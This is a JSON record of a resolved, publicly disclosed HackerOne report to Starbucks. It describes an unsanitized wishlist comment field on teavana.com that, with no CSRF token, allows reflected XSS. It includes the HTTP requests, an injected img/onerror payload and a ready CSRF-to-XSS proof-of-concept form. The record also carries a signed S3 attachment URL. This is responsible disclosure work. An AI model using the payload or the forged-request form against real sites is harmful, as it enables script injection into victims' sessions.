{
  "id": 177508,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzc1MDg=",
  "url": "https://hackerone.com/reports/177508",
  "title": "Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. (wishlist-comments)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2016-10-22T10:40:41.332Z",
  "submitted_at": "2016-10-22T10:40:41.332Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "faisalahmed",
    "url": "/faisalahmed",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1989,
    "url": "https://hackerone.com/starbucks",
    "handle": "starbucks",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Starbucks",
      "twitter_handle": "Starbucks",
      "website": "http://www.starbucks.com",
      "about": "OUR MISSION WITH EVERY CUP, WITH EVERY CONVERSATION, WITH EVERY COMMUNITYâ€“ WE NURTURE THE LIMITLESS POSSIBILITIES OF HUMAN CONNECTION"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-02-13T22:48:34.665Z",
  "bug_reporter_agreed_on_going_public_at": "2017-02-09T10:11:49.783Z",
  "team_member_agreed_on_going_public_at": "2017-02-13T22:48:34.625Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "User can add comments on their wishlist item. The http request which adds comment on wishlist item, looks like:\n\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=:comment_string\n```\nThe value of the `wishlistComment` reflects on the returned HTML snippet as bellow:\n\n```html\n<textarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\">\n:comment_string\n</textarea>\n```\n\nBut the returned string is not sanitized. As a result if user submits html/javascript payload as the value, that payload will return and will cause javascript execution.\n\n**vulnerable post**\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=</textarea><img+src=x+onerror=alert(1)>\n```\n**Response**\n```html\n<textarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\">\n</textarea><img src=x onerror=alert(1)>\n</textarea>\n```\n\nThere is no csrf token tied with the comment adding post request. As a result this csrf flaw can make the self-xss as a global reflected xss.\n\n**CSRF to XSS PoC**\n\n```html\n<html>\n  <body>\n    <form action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\" method=\"POST\">\n      <input type=\"hidden\" name=\"wishlistComment\" value=\"&lt;&#47;textarea&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\nReplace the `:id` with your wishlist id (ex: C1005285074). This will execute the javascript and will popup an alert box.\n\n{F129593}",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 129593,
      "file_name": "xssed.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?response-content-disposition=attachment%3B%20filename%3D%22xssed.png%22%3B%20filename%2A%3DUTF-8%27%27xssed.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXDWGU53J%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122552Z&X-Amz-Expires=743&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEQrBbU8Jad1w5JwSX%2BtcCe%2B%2Bf2fWuM59KuP4ISMFc4wAiBo2h1%2BGY0GcS29KJV9ChmgWe9tqhKd5ZLb1WWqvprHYiqxBQhwEAMaDDAxMzYxOTI3NDg0OSIMhG92oDXEtczQPYIjKo4Fy8fG%2F18wGKWDOaZUOzqIsPg%2F2%2Bhxtkqy9tw5WM0FnO0efhz261ude9PuTQW%2F8W1XVC%2B6%2Btv%2F%2FGVnCyHPPzSf21evTkJ%2F2elUnngDFTubvtbmQMdS4Rnt0%2FU%2FuXzMknf8g%2BX5PviUKj6nGgaRnY9Hp0kLUpB9xZV%2BBUdPCVV4HR0N%2BfR1rXE7N8YpBPWLYN%2BeSFjCXMLIPUyphbmsuZkyiXQtehFKt7nJxobss3F2hvjZloveNvwrVNVWJFNQom1gLI9F7%2BIpCnOeXjEy3MSXsLuTbawl2ybmhjHZrkvOBGKRCJZ%2B2u5iwtWDz1wnMZRyFyaeTcUEvO9J6iZaOADHjWDUQ0JKmYoztclRLBYdqnFqX4GvRgDrPlxBgIXLYhik%2BmiNM0sGzn7a7dUiYYPCq%2FdAd9zf%2Bi%2F2Nc6bbCemAOnCRpYV7CfzwpAvbOTg1ETpUulaDRVq85Dx2p0leRTu%2FT%2FWnLION%2BrUWGT9LWh7WHbiRD9czkDV6jmhMSgRB%2Bl0SrMovwZEVMZSrCU%2BLZ04O9Ixjhzq%2B1Vr0XZu7DRtQOja%2FirIkVuwQiYxCdihARcXY10a6JugOVRadvNpcM%2BWrNER7eW6Ggy%2F7f6BytYoIxde%2BqacE7wj84z9DiuAc2no4T1dj4uFJ7X6msn0%2FWRzATSRapOIgtEcp4pwGfB%2BgJFOL0hN4w15UCIL%2FBVzrYd%2BXa1P5NfHNayl%2B47A6AtIllD1sc5l2BQdyjSXlYZVLP2DEDSN%2F9jemORnER%2FjuktMS4RtWWHcTnxoCzT9%2F%2FA8uQ%2FnRXtwTrFdv9agI5vhmpVKiMFBKwXX8KP59Ilg%2Fit%2BFtjLhR36yfvnmCbVRQoElpkcYZZM0YhVFqxqlVMBMJKcrK4GOrIBANrznU6BJTMtT8T9H36XK5m%2BmVr8n6tG0lGtMpTogn8GvplsC4ZKMuQxe3g9N4DP5saesTh9dqff09EBOPWaGcNb6eKu1xWMCP6%2FWNwnlhKPZDaWoTSy84GV7wvrpprkfGE6wb4T1PsZpb%2FIZElZKvxaZpFBFfT0K3jPH7QW9j17n06s2QlpvBBCJkLlXBGs%2FcA4E70Mzy6JNhXk5S%2BRjCCYfigjYp55SDrDc%2F%2FldOze%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3e8d96c307c28141852f31fe06a4ac5b419311007dd9101949afe8a8d2b8ba82",
      "file_size": 1237626,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-03-11T10:11:49.821Z",
  "allow_singular_disclosure_after": -218600042.31487104,
  "singular_disclosure_allowed": true,
  "vote_count": 22,
  "voters": [
    "cxzer0",
    "hunter",
    "tripwire",
    "fizhimchik",
    "spam404",
    "jon_bottarini",
    "mpz",
    "eveeez",
    "khizer47",
    "sup3r-b0y",
    "and 12 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
